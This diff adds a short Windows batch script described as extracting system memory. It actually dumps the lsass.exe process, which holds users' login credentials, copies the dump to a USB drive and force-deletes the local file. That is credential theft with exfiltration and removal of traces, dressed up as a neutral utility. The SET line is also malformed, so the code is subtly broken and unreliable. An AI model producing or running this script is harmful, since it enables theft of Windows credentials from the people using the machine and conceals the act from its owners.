@@ -1,0 +1,16 @@
+REM This script extracts memory from a Windows 11 system.
+
+REM Change the value of the "output_file" variable to your desired output file name
+SET output_file "memory.dmp"
+
+REM Extract the memory to the specified output file
+procdump -ma lsass.exe %output_file%
+
+REM Copy the output file to a USB drive
+xcopy %output_file% G: /Y
+
+REM Delete the output file from the local system
+DEL /Q /F %output_file%
+
+REM Note: This script assumes that you have the Procdump tool installed on your system. 
+REM Procdump is a command-line utility that allows you to extract memory dumps from processes on a Windows system. 
